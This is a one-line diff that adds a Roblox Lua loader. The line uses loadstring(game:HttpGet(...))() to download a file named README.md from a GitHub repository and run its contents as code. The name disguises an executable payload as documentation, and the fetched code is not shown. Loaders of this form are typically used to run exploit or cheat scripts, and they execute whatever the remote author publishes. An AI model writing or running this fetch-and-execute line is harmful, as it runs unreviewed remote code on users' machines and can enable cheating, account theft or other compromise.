@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moiladiab-oss/MOILA933/main/README.md"))()
